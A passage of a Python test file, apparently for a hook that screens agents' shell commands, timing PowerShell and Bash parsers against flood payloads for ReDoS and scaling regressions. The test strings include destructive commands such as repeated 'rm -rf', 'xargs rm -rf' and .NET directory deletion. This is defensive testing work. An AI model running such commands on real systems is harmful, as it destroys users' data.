    (_PS_BASH_DASH_C_RE, 'bash -c "echo x > y"'),
    (_PS_BASH_DASH_C_RE, "& 'C:\\Program Files\\Git\\bin\\bash.exe' -c 'ls'"),
    (_PS_DOTNET_FILE_RE, "[IO.File]::WriteAllText('x', 'y')"),
    (_PS_DOTNET_FILE_RE, "[System.IO.Directory]::Delete('x', $true)"),
    (_PS_ITEM_PROPERTY_ASSIGN_RE, "(Get-Item x).IsReadOnly = $true"),
    (_PS_ITEM_PROPERTY_ASSIGN_RE, "(gi -Path x).Attributes += 'Hidden'"),
])
def test_shell_routing_and_coverage_regexes_still_match(pattern, payload):
    assert pattern.search(payload) is not None, payload


# The program string's worst cases, each a builder over the body length so
# the ceiling row and the scaling arm below drive the same shapes at two
# sizes: an unclosed single-quoted body made of doubled quotes (escape or
# close, at every pair), an unclosed double-quoted body of backticks (every
# one an escape), and the mixed run; the opener never completes, so every
# branch is exercised.
_PS_BODY_FLOODS: list[tuple[str, Callable[[int], str]]] = [
    ("sq_doubled_quote_run", lambda n: "python -c '" + "''" * (n // 2)),
    ("dq_backtick_run", lambda n: 'python -c "' + "`" * n),
    ("dq_mixed_run", lambda n: 'python -c "' + '`"a""' * (n // 5)),
    # a segment full of here-string openers with ONE terminator at the end
    ("here_string_openers", lambda n: "@'\n" * (n // 3) + "'@ | pwsh -c -"),
    # a FLOOD of piped-stdin openers through the extractor, which is what the
    # hook runs: the first cut read the whole prefix as each opener's segment
    # and re-scanned it for every shell head -- seven seconds on 856 bytes,
    # past the hook's timeout, with a real protected write in front (review,
    # driven). The isolated-regex rows above could not see it.
    ("stdin_pwsh_flood",
     lambda n: "Set-Content -Path tools/cc/hooks/x.py -Value x" + "|pwsh" * (n // 5)),
    ("stdin_py_flood", lambda n: "x" + "|py -" * (n // 5)),
    ("stdin_here_string_flood", lambda n: "@'\nx\n'@|pwsh -c -;" * (n // 16)),
    # a flood of LITERAL spans with no pipe at all: the masker's re-parse
    # lookbehind read the whole prefix for every one (quadratic; 1.6 s at
    # this size before the lookback was bounded)
    ("literal_span_flood", lambda n: "$a = @'\nx\n'@; " * (n // 16)),
    ("quoted_literal_flood", lambda n: "$a = 'x'; " * (n // 10)),
    # a flood of EXPANDABLE spans (DEF-753): the double-quoted branch now asks
    # the same bounded lookbehind, but only for a span with a separator or an
    # escape in it -- an ordinary quoted argument is masked identically in
    # both modes and skips it (review, measured 4.4 ms to 83 ms at 32 KB
    # before the skip). The second row has a separator in every span, so the
    # lookback is asked for each and its cost has a witness.
    ("dq_span_flood", lambda n: "".join('Write-Output "a%d"; ' % i for i in range(n // 20))),
    ("dq_separator_span_flood", lambda n: 'Write-Output "a;1"; ' * (n // 20)),
]


def _ps_body(payload: str) -> None:
    """What the ceiling row and the scaling arm time: the two program-body
    patterns, then the whole extractor, which is what the hook runs."""
    _PS_PROGRAM_STRING_RE.findall(payload)
    _PS_HERE_STRING_RE.search(payload)
    _candidate_paths_from_powershell(payload)


@pytest.mark.parametrize("label,make", _PS_BODY_FLOODS)
def test_ps_program_body_linear_on_unclosed_runs(label, make):
    """DEF-712: the PowerShell program string and the here-string body are
    mutually-exclusive alternations, so an unclosed literal costs one pass,
    and a flood of piped-stdin openers costs one boundary pass. Driven
    through the whole extractor, which is what the hook runs. A CHAIN row:
    `quoted_literal_flood` is the chain tier's recorded floor, and at the
    regex rows' shared 1 s line it read red on a 3.14 clean-checkout runner
    (DEF-922's fifth site, CI 35954967897, 2026-09-24)."""
    if not hasattr(signal, "SIGALRM"):
        pytest.skip("signal.alarm not available on this platform")
    payload = make(_WORST_CASE_BODY_LEN)
    signal.signal(signal.SIGALRM, _alarm)
    signal.setitimer(signal.ITIMER_REAL, _CHAIN_CEILING_MS / 1000.0)
    t = time.time()
    try:
        _ps_body(payload)
        elapsed_ms = (time.time() - t) * 1000
    except _Timeout:
        pytest.fail(f"{label}: the PowerShell program body exceeded {_CHAIN_CEILING_MS}ms")
    finally:
        signal.setitimer(signal.ITIMER_REAL, 0)
    assert elapsed_ms < _CHAIN_CEILING_MS, f"{label}: {elapsed_ms:.1f}ms"


# The scaling arm beside the chain ceiling: the detector for SHAPE (DEF-817),
# in the speedbump file's pair form. A flood at the cap costs at most
# `_PS_BODY_LINEAR_RATIO` times the same flood at half the cap plus a noise
# floor, both judged net of the per-call cost measured on THIS host (the
# walker row's lesson: a memoised reader's rebuild scales with the host, not
# the payload -- about 1 ms here, over a hundred on a shared runner), read inside
# each window (DEF-2002, :func:`_window_order`). A pair whose half-cap reading
# is under the sample floor is not judged: single-digit milliseconds are clock
# noise on this box. A misread under load is no reason to lower the ratio: 2.83
# was measured and did no better (DEF-2000, at
# `tests/test_speedbump_irreversible.py::_search_window_ms`).
_PS_BODY_LINEAR_RATIO = 3.0
_PS_BODY_NOISE_FLOOR_MS = 1.0
_PS_BODY_MIN_SAMPLE_MS = 5.0
_PS_BODY_SAMPLES = 3
#: A scaling window's zero-payload samples, one at each end, on both arms
#: (:func:`_window_order`, whose shape test reads it); the timeout pin counts with it.
_WINDOW_ZERO_SAMPLES = 2


def _window_order(zero: str, small: str, big: str, samples: int) -> list[tuple[int, str]]:
    """One window's calls of a scaling arm, in order, as ``(floor, payload)``: the
    zero payload (floor 0) at each END, and between them ``samples`` interleaved
    pairs, small (floor 1) then big (floor 2). Both arms read it, so they take one
    shape. The pairs interleave so one slowdown as long as three small samples
    took back to back cannot lift the small floor alone and read a quadratic
    linear (DEF-2000); interleaving narrows that misread and does not close it: a
    slowdown spanning a window's three small samples and every big one but the
    last still reads a quadratic linear. The per-call cost is read inside the
    window it is subtracted from, at its two ends (DEF-2002): until then three
    zero-payload calls read back to back before the first window set the cost both
    windows subtracted, and one slowdown over them read a linear consumer
    super-linear on two windows, or its half-cap sample under the floor (Task 0 on
    the Air, 2026-10-18: 4.9 -> 24.9 ms net at a 30 ms per-call cost, slowed 1.5
    times). A floor is a minimum, so a slowdown lifts this one only by covering
    both ends -- the whole window, which lifts every sample with it. Three zero
    samples interleaved as a third size, the shape first filed, leave a slowdown
    over seven of the nine calls that lifts the zero floor alone, and take the
    PowerShell arm's worst case past the per-test timeout."""
    pairs = [(floor, payload) for _ in range(samples) for floor, payload in ((1, small), (2, big))]
    return [(0, zero), *pairs, (0, zero)]


def _ps_body_call_ms(fn: Callable[[str], object], payload: str) -> float | None:
    """One timed call, the memoised readers cleared first; None when it
    overran `_CHAIN_CEILING_MS`. The caller pauses the cyclic collector. On a
    host without SIGALRM (Windows) it skips the test that reached it."""
    if not hasattr(signal, "SIGALRM"):
        pytest.skip("the PowerShell body timer arms signal.SIGALRM, not available on this platform")
    _clear_walker_caches()
    signal.signal(signal.SIGALRM, _alarm)
    signal.setitimer(signal.ITIMER_REAL, _CHAIN_CEILING_MS / 1000.0)
    t0 = time.perf_counter()
    try:
        fn(payload)
        signal.setitimer(signal.ITIMER_REAL, 0)
        return (time.perf_counter() - t0) * 1000
    except _Timeout:
        return None
    finally:
        signal.setitimer(signal.ITIMER_REAL, 0)


def _overran(length: int, zero: str) -> str:
    """Where a window's call overran its ceiling: the zero-payload call, which
    points at the host, or a payload by its bytes, which points at the shape
    (the speedbump arm's form, DEF-4001: a bare None could not say)."""
    return "on the zero-payload call" if length == len(zero) else f"at {length} bytes"


def _ps_body_window_ms(
    fn: Callable[[str], object], big: str, small: str, zero: str,
) -> tuple[float, float, float] | int:
    """One window of the pair rule: ``(t_zero_ms, t_small_ms, t_big_ms)``, the
    floor of each size's timings in :func:`_window_order` (`_PS_BODY_SAMPLES` at
    each size, the zero payload at the window's two ends), the cyclic collector
    paused throughout and restored after (the walker discipline); when a call
    overran `_CHAIN_CEILING_MS`, its payload's length (:func:`_overran`). The
    window's pair is judged net of its own zero floor (DEF-2002)."""
    floors: tuple[list[float], list[float], list[float]] = ([], [], [])
    collector_was_on = gc.isenabled()
    gc.disable()
    try:
        for floor, payload in _window_order(zero, small, big, _PS_BODY_SAMPLES):
            elapsed_ms = _ps_body_call_ms(fn, payload)
            if elapsed_ms is None:
                return len(payload)
            floors[floor].append(elapsed_ms)
    finally:
        if collector_was_on:
            gc.enable()
    return min(floors[0]), min(floors[1]), min(floors[2])


def _ps_body_scaling_verdict(
    fn: Callable[[str], object], big: str, small: str, zero: str,
) -> str | None:
    """None when the pair reads linear; otherwise the sentence naming the
    reading -- super-linear on two windows, an overrun, or a half-cap sample
    under the floor, which is a RED with its remedy and never a silent pass
    (the walker arm's discipline; the speedbump arm's None-under-the-floor is
    right for regex rows whose whole cost is single-digit milliseconds and
    wrong for a population whose smallest label reads 14 ms net -- failure-mode
    review). A pair over the bound is asked again as a second window judged on
    its own, and the window with the lower ratio is the estimate (noise
    inflates the big sample). ``zero`` is the warm, near-empty call whose cost
    is the per-call rebuild on this host, timed at each window's two ends and
    subtracted from that window's samples (DEF-2002). An under-floor sample is a
    red either way, and its sentence names the cause by the walker arm's rule
    (DEF-926, :func:`_is_swamped`): a per-call cost above what is left of the
    sample is a slow or loaded host (or a spike on the window's zero samples),
    never a fast box."""

    def under_floor(t_s: float, t_z: float, which: str) -> str:
        net = t_s - t_z
        if _is_swamped(t_z, net, floor_ms=_PS_BODY_MIN_SAMPLE_MS):
            return (
                f"{t_s:.1f}ms at {len(small)} bytes is mostly the {t_z:.1f}ms per-call cost "
                f"({net:.1f}ms net{which}), under the {_PS_BODY_MIN_SAMPLE_MS}ms sample floor, so "
                "its ratio cannot be judged here: a slow or loaded host, or a slowdown on the "
                "window's zero-payload samples, not a fast box -- re-run on a quiet host; the "
                "floors are not the problem, and never widen the bound"
            )
        return (
            f"{t_s:.1f}ms at {len(small)} bytes ({net:.1f}ms net of the {t_z:.1f}ms "
            f"per-call cost) is under the {_PS_BODY_MIN_SAMPLE_MS}ms sample floor{which}, so its "
            "ratio cannot be judged: this host is much faster than the one the floors were "
            "measured on (re-measure), the body got cheaper (re-measure), or the payload is "
            "too small for its shape (resize it); never widen the bound"
        )

    first = _ps_body_window_ms(fn, big, small, zero)
    if isinstance(first, int):
        return f"exceeded {_CHAIN_CEILING_MS}ms {_overran(first, zero)}"
    t_zero, t_small, t_big = first
    net_small, net_big = t_small - t_zero, t_big - t_zero
    if net_small < _PS_BODY_MIN_SAMPLE_MS:
        return under_floor(t_small, t_zero, "")
    bound = _PS_BODY_LINEAR_RATIO * net_small + _PS_BODY_NOISE_FLOOR_MS
    if net_big <= bound:
        return None
    second = _ps_body_window_ms(fn, big, small, zero)
    if isinstance(second, int):
        return f"exceeded {_CHAIN_CEILING_MS}ms {_overran(second, zero)} on the second window"
    t_zero_2, t_small_2, t_big_2 = second
    net_small_2, net_big_2 = t_small_2 - t_zero_2, t_big_2 - t_zero_2
    if net_small_2 < _PS_BODY_MIN_SAMPLE_MS:
        return under_floor(t_small_2, t_zero_2, " on the second window")
    windows = ""
    r1 = net_big / net_small
    if net_big_2 / net_small_2 < r1:
        windows = (
            f"; the first window read {net_small:.1f} -> {net_big:.1f}ms net of its "
            f"{t_zero:.1f}ms (ratio {r1:.2f}) and the second was chosen for its lower ratio"
        )
        t_zero, net_small, net_big = t_zero_2, net_small_2, net_big_2
        bound = _PS_BODY_LINEAR_RATIO * net_small + _PS_BODY_NOISE_FLOOR_MS
        if net_big <= bound:
            return None
    return (
        f"{net_small:.1f}ms at {len(small)} bytes -> {net_big:.1f}ms at {len(big)} bytes, "
        f"net of the {t_zero:.1f}ms per-call cost (ratio {net_big / net_small:.2f}, "
        f"bound {bound:.1f}ms): super-linear on two windows{windows}"
    )


@pytest.mark.parametrize("label,make", _PS_BODY_FLOODS)
def test_ps_program_body_scales_linearly_on_unclosed_runs(label, make):
    """The shape detector beside the chain ceiling: at one size the ceiling
    cannot tell a linear body that is slow from a quadratic one that is
    short, and a ceiling ten times the floor hides a real ten-fold regression
    outright. Each flood at the cap is judged against the same flood at half
    the cap (measured 2026-09-24: `quoted_literal_flood` 78 / 163 / 336 ms at
    7.5 / 15 / 30 KB, ratio about two; the smallest label reads 14 ms net at
    half the cap). A pair under the sample floor reds naming the remedy,
    never passes silently. Who: the adopter whose hook a quadratic body
    would time out on a pasted command the ceiling still passed."""
    if not hasattr(signal, "SIGALRM"):
        pytest.skip("signal.alarm not available on this platform")
    verdict = _ps_body_scaling_verdict(
        _ps_body, make(_WORST_CASE_BODY_LEN), make(_WORST_CASE_BODY_LEN // 2), make(64),
    )
    assert verdict is None, f"{label}: {verdict}"


def test_ps_body_scaling_rule_still_reds_a_quadratic_stand_in():
    """The must-trip control for the pair rule, on every host: a stand-in
    whose cost is quadratic in the payload -- 40 ms at the cap, 10 at half,
    spun on the clock and never slept, so the reading does not depend on the
    host's speed -- reads about four on both windows, and the rule names it
    at sizes the ceiling row alone would pass."""
    if not hasattr(signal, "SIGALRM"):
        pytest.skip("signal.alarm not available on this platform")
    n_big = _WORST_CASE_BODY_LEN

    def quadratic(payload: str) -> None:
        cost = 40.0 * (len(payload) / n_big) ** 2
        end = time.perf_counter() + cost / 1000.0
        while time.perf_counter() < end:
            pass

    verdict = _ps_body_scaling_verdict(quadratic, "x" * n_big, "x" * (n_big // 2), "x" * 64)
    assert verdict is not None and "super-linear" in verdict, verdict


def test_ps_body_scaling_rule_reds_a_pair_under_the_sample_floor():
    """A body too cheap to judge is a red with its remedy, not a silent pass:
    a stand-in that costs nothing reads under the sample floor at half the
    cap, and the rule says so rather than acquitting it. Its per-call cost is
    near nothing too, so the sentence keeps the fast-box remedies (DEF-926's
    routing, which DEF-2002 brought to this arm)."""
    if not hasattr(signal, "SIGALRM"):
        pytest.skip("signal.alarm not available on this platform")
    n_big = _WORST_CASE_BODY_LEN
    verdict = _ps_body_scaling_verdict(lambda _p: None, "x" * n_big, "x" * (n_big // 2), "x" * 64)
    assert verdict is not None and "sample floor" in verdict and "never widen" in verdict, verdict
    assert "much faster" in verdict and "slow or loaded host" not in verdict, verdict


#: DEF-2000's slowdown: the measured small-sample floor read 1.53 times its median
#: (35.4 against 23.2 ms on the Windows self-host box, 2026-10-11).
_BURST_FACTOR = 1.5


def _burst_call_clock(
    ms_at_big: float, n_big: int, burst_ms: float, calls: list[int],
) -> Callable[..., float]:
    """A stand-in for a one-call timer (:func:`_ps_body_call_ms`,
    :func:`_walker_call_ms`) on a simulated clock: a quadratic cost,
    ``ms_at_big`` at ``n_big`` bytes, and every call that STARTS in the first
    ``burst_ms`` after the first window's pairs open (the first payload over 64
    bytes; the window's opening zero-payload call is before it) costs
    `_BURST_FACTOR` times more -- one sustained slowdown. Records each length,
    so a row asserts the order its windows timed: the burst opens with the
    window, so a big-first back-to-back window would pass the reading alone
    (failure-mode review)."""
    now: list[float | None] = [None]

    def reading(*args: object) -> float:
        payload = args[1]
        assert isinstance(payload, str)
        calls.append(len(payload))
        cost = ms_at_big * (len(payload) / n_big) ** 2
        if len(payload) > 64 and now[0] is None:
            now[0] = 0.0
        if now[0] is not None:
            if now[0] < burst_ms:
                cost *= _BURST_FACTOR
            now[0] += cost
        return cost
    return reading


#: DEF-2002's per-call cost: a host that pays tens of milliseconds a call to rebuild the memoised
#: readers (195 ms on the 2026-09-25 shared runner, DEF-926), near the net sample, where a slowdown
#: over the per-call floor alone tips a linear reading.
_FLOOR_PER_CALL_MS = 30.0


def _floor_slowdown_clock(
    net_small_ms: float, n_big: int, samples: int, calls: list[tuple[int, bool]], *,
    at: Literal["head", "tail", "spikes"],
) -> Callable[..., float]:
    """A stand-in for a one-call timer on a simulated clock, for DEF-2002: a LINEAR
    cost, `_FLOOR_PER_CALL_MS` per call plus ``2 * net_small_ms`` in proportion at
    ``n_big`` bytes, and one sustained slowdown of `_BURST_FACTOR` as long as three
    zero-payload calls take under it -- the three floor reads the arms took back to
    back before their first window until DEF-2002. Every call that STARTS inside it
    costs that much more. ``at="head"`` opens it at the first zero-payload call (64
    bytes), where it covered exactly those three reads; ``at="tail"`` opens it at the
    ``samples``-th big call, the first window's last, so it covers what follows it;
    ``at="spikes"`` slows only the first two zero-payload calls, the first window's
    two ends -- two spikes, not one slowdown, the one shape that lifts a window's
    floor alone. Records each call's length and whether it ran slowed, so a row
    asserts the slowdown reached a zero-payload call."""
    assert at in ("head", "tail", "spikes"), at  # a typo would run another schedule
    now: list[float | None] = [None]
    bigs = [0]
    zeros = [0]

    def reading(*args: object) -> float:
        payload = args[1]
        assert isinstance(payload, str)
        if len(payload) == n_big:
            bigs[0] += 1
        if len(payload) == 64:
            zeros[0] += 1
        opens = len(payload) == 64 if at == "head" else len(payload) == n_big and bigs[0] == samples
        if now[0] is None and opens and at != "spikes":
            now[0] = 0.0
        cost = _FLOOR_PER_CALL_MS + 2 * net_small_ms * len(payload) / n_big
        slowed = now[0] is not None and now[0] < 3 * _BURST_FACTOR * _FLOOR_PER_CALL_MS
        if at == "spikes":
            slowed = len(payload) == 64 and zeros[0] <= 2
        if slowed:
            cost *= _BURST_FACTOR
        if now[0] is not None:
            now[0] += cost
        calls.append((len(payload), slowed))
        return cost
    return reading


def _window_costs_clock(
    per_window: list[tuple[float, float, float]], samples: int, n_small: int, n_big: int,
    calls: list[int],
) -> Callable[..., float]:
    """A stand-in for a one-call timer reading fixed costs by window, for the rows
    that read a sentence: ``per_window[k]`` is window ``k``'s ``(zero, small, big)``
    cost, the window counted from the calls seen (each is :func:`_window_order`'s
    length; the walker's warm call goes to :func:`_walker_alarmed_ms`, not this
    stand-in). Records each length."""
    size = len(_window_order("", "", "", samples))

    def reading(*args: object) -> float:
        payload = args[1]
        assert isinstance(payload, str)
        zero, small, big = per_window[len(calls) // size]
        calls.append(len(payload))
        return {n_small: small, n_big: big}.get(len(payload), zero)
    return reading


def test_a_scaling_window_reads_its_zero_floor_at_both_ends():
    """DEF-2002's shape, pinned by position: both arms' windows open and close on the
    zero payload, with the pairs interleaved between. The rows on a simulated clock
    hold the shape's readings, and five other placements of the two zero samples --
    the opening one moved inward -- passed every one of them (failure-mode review),
    one of them reading a linear walker flat under one slowdown."""
    for samples in (_PS_BODY_SAMPLES, _WALKER_SAMPLES):
        order = _window_order("z", "s", "b", samples)
        assert [floor for floor, _ in order] == [0, *[1, 2] * samples, 0], order
        assert [payload for _, payload in order] == ["z", *["s", "b"] * samples, "z"], order
        assert sum(1 for floor, _ in order if floor == 0) == _WINDOW_ZERO_SAMPLES, order


@pytest.mark.parametrize("at", ["head", "tail"])
@pytest.mark.parametrize("net_small_ms", [20.0, 24.0], ids=["net-20ms", "net-24ms"])
def test_ps_body_scaling_rule_reads_a_linear_body_linear_through_a_slowdown_on_its_floor(
        monkeypatch, net_small_ms, at):
    """DEF-2002, the PowerShell body arm: the per-call cost was the floor of three
    zero-payload calls read back to back before the first window, and both windows
    were judged net of it. One slowdown as long as those three calls (30 ms each,
    1.5 times) lifted the floor to 45 ms and left the windows clean, so a linear body
    at 24 ms net read 8.8 -> 32.8 ms (ratio 3.7: super-linear on two windows), and at
    20 ms its half-cap sample read 4.9 ms net, under the sample floor, which reds
    with the faster-host remedy -- both false reds, and only a linear body could get
    them. A window now times the zero payload at its two ends and is judged net of its
    own floor, so a slowdown over its opening sample (``head``) or its closing one
    (``tail``) leaves the other end to set the floor, and the first window reads it
    linear with no second asked. On a simulated clock
    (:func:`_floor_slowdown_clock`), so it needs no alarm and runs on every host."""
    n_big = _WORST_CASE_BODY_LEN
    calls: list[tuple[int, bool]] = []
    monkeypatch.setattr(sys.modules[__name__], "_ps_body_call_ms", _floor_slowdown_clock(
        net_small_ms, n_big, _PS_BODY_SAMPLES, calls, at=at))
    verdict = _ps_body_scaling_verdict(lambda _p: None, "x" * n_big, "x" * (n_big // 2), "x" * 64)
    assert (64, True) in calls, calls  # the slowdown reached a zero-payload call
    assert verdict is None, f"a linear body read: {verdict}"
    assert sum(1 for n, _ in calls if n == n_big) == _PS_BODY_SAMPLES, calls  # one window was enough


def test_ps_body_scaling_rule_reads_a_quadratic_through_a_slowdown_on_its_small_samples(monkeypatch):
    """DEF-2000, the PowerShell body arm: a slowdown as long as a window's three
    small samples take back to back lifts the small floor (10 -> 15 ms) and
    leaves the big one clean (40), ratio 2.67 inside the 3.0 bound, which passed
    a quadratic body on that one read. The window interleaves its samples, so
    the slowdown also covers the first big sample and the clean ones set both
    floors. On a simulated clock (:func:`_burst_call_clock`), so it needs no
    alarm and runs on every host."""
    n_big = _WORST_CASE_BODY_LEN
    n_small = n_big // 2
    small_ms = 40.0 * (n_small / n_big) ** 2
    calls: list[int] = []
    monkeypatch.setattr(sys.modules[__name__], "_ps_body_call_ms", _burst_call_clock(
        40.0, n_big, _PS_BODY_SAMPLES * _BURST_FACTOR * small_ms, calls))
    verdict = _ps_body_scaling_verdict(lambda _p: None, "x" * n_big, "x" * n_small, "x" * 64)
    assert verdict is not None and "super-linear" in verdict, verdict
    # two windows, each interleaved small-first
    assert [n for n in calls if n > 64] == [n_small, n_big] * (2 * _PS_BODY_SAMPLES), calls


def test_the_ps_body_scaling_arm_cannot_outlast_the_per_test_timeout(monkeypatch):
    """A re-pin that lifts `_CHAIN_CEILING_MS`, or a window that takes more
    samples, could let one label's worst case -- two windows, each of
    `_WINDOW_ZERO_SAMPLES` zero-payload calls and `_PS_BODY_SAMPLES` at each of
    two sizes, every call capped by the alarm at the ceiling -- outlast pytest's
    per-test `timeout`, and a timeout kill reports no reading at all
    (failure-mode review). 2 x (2 + 2 x 3) x 3400 ms is 54.4 s against 60 s; three
    zero samples a window, the shape DEF-2002 was filed with, read 61.2 s. The
    count is driven as well as named: the arm's longest path (a stand-in
    super-linear on both windows) is counted on a stubbed timer and must equal
    the constants' product. And the verdict's structure is read, so a path the
    stand-in does not reach cannot add calls unseen (DEF-2002's failure-mode
    review drove a third window behind the under-floor return past every other
    row): exactly two window calls, no loop, and no call of the body outside a
    window, which is how an unalarmed warm call would read. The timeout is
    derived from pyproject.toml, never copied (:func:`_pyproject_timeout_s`, which
    the walker row's budget reads too)."""
    timeout_s = _pyproject_timeout_s()
    assert timeout_s > 0, "pyproject.toml declares no pytest timeout"
    n_big = _WORST_CASE_BODY_LEN
    calls: list[int] = []
    monkeypatch.setattr(sys.modules[__name__], "_ps_body_call_ms", _burst_call_clock(40.0, n_big, 0.0, calls))
    verdict = _ps_body_scaling_verdict(lambda _p: None, "x" * n_big, "x" * (n_big // 2), "x" * 64)
    assert verdict is not None and "super-linear on two windows" in verdict, verdict  # the longest path ran
    assert len(calls) == 2 * (_WINDOW_ZERO_SAMPLES + 2 * _PS_BODY_SAMPLES), calls
    module = ast.parse(Path(__file__).read_text(encoding="utf-8"))
    verdict_def = next(node for node in ast.walk(module)
                       if isinstance(node, ast.FunctionDef) and node.name == "_ps_body_scaling_verdict")
    called = [node.func.id for node in ast.walk(verdict_def)
              if isinstance(node, ast.Call) and isinstance(node.func, ast.Name)]
    assert called.count("_ps_body_window_ms") == 2, called
    assert "fn" not in called and "_ps_body_call_ms" not in called, called
    loops = [node for node in ast.walk(verdict_def) if isinstance(node, (ast.For, ast.While, ast.comprehension))]
    assert not loops, [node.lineno for node in loops if hasattr(node, "lineno")]
    worst_ms = len(calls) * _CHAIN_CEILING_MS
    assert worst_ms < timeout_s * 1000, (worst_ms, timeout_s)


# ── the Bash inert-syntax WALKER, not a regex (DEF-754) ──────────────────────
#
# Every budget above times a compiled pattern; the walker that fronts them --
# `mask_inert_syntax` -> `_walk_shell_roles` -- is a function, so no ReDoS gate
# could see it. Measured 2026-09-10 on the self-host box: on a run of unmatched
# grouping characters the head capture scanned the whole remainder once per
# character (53 ms at 1 KB, 3.3 s at 8 KB, about 53 s at 32 KB), ahead of the
# recursive-delete check, the protected-write extractors and every speed-bump
# predicate -- a slow-hook shape on the tier maintenance mode cannot bypass.
#
# The flood is sized to the WALKER'S bound, `_ROLE_MAP_CAP` (64 KB), not the
# 32 KB `_BASH_COMMAND_CAP`: that cap is `_cap_for_scan`'s, which the
# extraction leg applies, while the dangerous-reason leg and the speed-bump
# predicates hand the walker the raw command (review) -- though part of each
# of those walks is extraction-capped too, which is why the SCALING row
# below sizes every consumer by the cap it is DECLARED under in
# `_WALKER_CONSUMERS` (by measurement) while this ceiling row runs them all
# at the walker's own bound. Derived, so it follows the cap if it moves --
# the sibling `_SPEEDBUMP_FLOOD_LEN` in tests/test_speedbump_irreversible.py
# carries the same reasoning.
_WALKER_FLOOD_LEN = _ROLE_MAP_CAP - 64

# One MAKER per flood, a function of the byte count, so one list sizes both
# walker rows: the ceiling row's population is every maker at
# `_WALKER_FLOOD_LEN`, and the scaling row sizes each consumer at a half and a
# quarter of its own cap. Derived, not copied (a flood added here is in both
# rows), and the ceiling row's payloads are byte-for-byte the literals this
# list replaced -- asserted against the previous module at the change
# (TP-454 3-C).
_WALKER_FLOOD_MAKERS = [
    ("open_paren_run", lambda n: "iex " + "(" * n),
    ("close_paren_run", lambda n: "iex " + ")" * n),
    ("open_brace_run", lambda n: "iex " + "{" * n),
    ("close_brace_run", lambda n: "iex " + "}" * n),
    # the pasted stack of command substitutions the ledger row names
    ("substitution_stack", lambda n: "echo " + "$(" * (n // 2)),
    ("mixed_openers", lambda n: "x" + "({" * (n // 2)),
    # a run of `#` behind a glued brace: `_opens_comment` refuses the opener
    # (a brace is not in its opener set), so the comment branch scanned the
    # run once per `#` and stayed armed (failure-mode review)
    ("hash_run_after_brace", lambda n: "echo hi{" + "#" * n),
    ("hash_run_after_bare_brace", lambda n: "a>{" + "#" * n),
    # DEF-848's lane: the walker steps over an assignment word to where bash
    # ends it, masking each quoted piece of the value, and the command-position
    # arm reads the same pieces -- every quote kind, an escaped blank, a
    # separator inside the value, and a run that ends on an unterminated quote
    ("single_quoted_assignment_run", lambda n: "A='a b' " * (n // 8)),
    ("double_quoted_assignment_run", lambda n: 'A="a b" ' * (n // 8)),
    ("ansi_c_assignment_run", lambda n: "A=$'a b' " * (n // 9)),
    ("escaped_blank_assignment_run", lambda n: "A=a\\ b " * (n // 7)),
    ("separator_in_value_run", lambda n: "A='a;b'; " * (n // 9)),
    ("assignment_run_then_unterminated", lambda n: "A='a b' " * (n // 8 - 1) + "A='x"),
    # The quoted-operand cut (2026-10-07): every statement opens a quote the
    # separator-stop class cuts inside, so each span reader extends it through
    # `_span_end_through_quotes` -- one cached structure per text, a bisect
    # per match -- and the placed readings re-slice the chain's statements
    # (`chain_statement_slices`). A flood of them must stay linear: the
    # closed form, the never-closed form (the regex's end stands, and the
    # structure's one pass must not re-scan from each opener), and the
    # pipe-fed carrier whose enumerator span now carries a quoted word whole.
    ("quoted_separator_remove_run", lambda n: 'rm -rf "a&b"; ' * (n // 14)),
    ("unterminated_quote_remove_run", lambda n: 'rm -rf "a&' * (n // 10)),
    ("quoted_separator_carrier_run", lambda n: 'find "a&b" | xargs rm -rf; ' * (n // 27)),
    # the quoted arm's WIDTH, not only the count: a 400-character quoted word
    # per carrier (the regression the failure-mode review found sat at 256)
    ("quoted_long_word_carrier_run", lambda n: ('find "' + 'a&' * 200 + '" | xargs rm -rf; ') * (n // 424)),
    # DEF-3042: a dash word then a slashed wrapper name, repeated. The
    # anchor's `(?<=/)` arm started a wrapper run at every `env` and took
    # each later `/a/env` as the flag's argument to the end before the verb
    # failed: 1.6 s at 4 KB in the removed-or-relocated reader, about 4x per
    # doubling, while every flood above read linear. The row's probe, byte
    # for byte. The glued (`-a/env`) and numeric (`1/nice`) spellings and the
    # slashed `watch`/`script` are still quadratic, by ruling, and are rows
    # (DEF-3051, DEF-3050), so they are not floods here yet.
    ("slashed_wrapper_flag_argument_run", lambda n: "find build" + " -exec /a/env" * ((n - 17) // 13) + " -print"),
]

_WALKER_FLOODS = [(label, make(_WALKER_FLOOD_LEN)) for label, make in _WALKER_FLOOD_MAKERS]

# The five consumers the PreToolUse path pays for a Bash command, each reaching
# the walker through its own string: the masker itself; the protected-write
# extractor (through `_cap_for_scan`'s head-and-tail splice); the
# dangerous-reason leg (raw); a speed-bump predicate (through
# `_masked_command`, raw); the zone tier's removed-or-relocated reader.
# Hand-listed with that reason, the way the sibling populations name theirs:
# the other `_masked_command` call sites share the one walk these rows time.
#
# The third field is the CAP the consumer's walk is bounded by, which sizes
# the scaling row's two payloads (`_walker_sizes`: the largest flood under
# the cap, and half of it): above its cap a consumer measures flat, and a
# quadratic part hides there. A consumer is
# declared under the SMALLEST cap any part of its walk is bounded by, and the
# declaration is by measurement, not by reading the outer call path. The two
# ratios beside each entry are its per-doubling times from 16 KB to 32 KB and
# from 32 KB to 64 KB on `open_brace_run` under the scaling row's own
# discipline (warm, caches cleared, the minimum of three), 2026-09-22 on the
# self-host box at load 1.7 (TP-454 3-C): near 2 is linear, near 1 is the
# cap. `bash_dangerous_reason` and `speedbump_forcepush` hand the walker the
# raw command, yet part of each walk is extraction-capped (1.62 and 1.31
# above 32 KB against 2.0 below it), so both are declared under
# `_BASH_COMMAND_CAP`; only the masker is linear to `_ROLE_MAP_CAP`.
_WALKER_CONSUMERS = [
    # 2.02 / 2.09 -- linear to the walker's own cap
    ("mask_inert_syntax", lambda cmd, root: mask_inert_syntax(cmd), _ROLE_MAP_CAP),
    # 2.00 / 1.01 -- `_extractor_pair` -> `_cap_for_scan`
    ("candidate_paths_from_bash", lambda cmd, root: _candidate_paths_from_bash(cmd),
     _BASH_COMMAND_CAP),
    # 2.05 / 1.62 -- partly capped
    ("bash_dangerous_reason", lambda cmd, root: write_guard._bash_dangerous_reason(cmd, root),
     _BASH_COMMAND_CAP),
    # 2.05 / 1.31 -- partly capped
    ("speedbump_forcepush",
     lambda cmd, root: _speedbump._pred_forcepush("Bash", {"command": cmd}, root),
     _BASH_COMMAND_CAP),
    # the zone tier's removed-or-relocated reader (the fifth consumer, DEF-830's
    # review: it runs every mutation arm on every Bash call, the loop openers
    # behind their witness gate among them, and was never timed here)
